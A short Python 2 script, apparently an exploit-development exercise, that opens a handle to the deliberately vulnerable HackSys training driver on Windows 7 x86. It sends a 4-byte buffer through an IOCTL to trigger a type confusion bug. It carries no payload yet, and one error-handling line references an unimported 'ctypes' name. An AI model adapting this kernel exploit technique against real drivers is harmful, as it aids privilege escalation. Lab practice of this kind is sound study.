# Windows Kernel Exploitation 
# HEVD x86 Type Confusion
# Platform: Windows 7 x86
# Arjun Basnet

from ctypes import *
from ctypes.wintypes import *

kernel32  = windll.kernel32

def main():
	lpBytesReturned = c_ulong()
	
	#(GENERIC_READ | GENERIC_WRITE) = 0XC0000000
	hDevice = kernel32.CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", 0xC0000000, 0, None, 0x3, 0, None)
	
	if not hDevice or hDevice == -1:
		print "[!] Error to get handle to the driver " + str(ctypes.GetLastError())
		return -1
	
	#User input
	buf = "\x41" * 4 
	
	bufSize  = len(buf)
	bufPtr = id(buf) + 20
	print "[+] Input Buffer Pointer Address: 0x%X" % bufPtr
	
	kernel32.DeviceIoControl(hDevice, 0x222023, bufPtr, bufSize, None, 0,byref(lpBytesReturned), None)
	
	
if __name__ == '__main__':
	main()
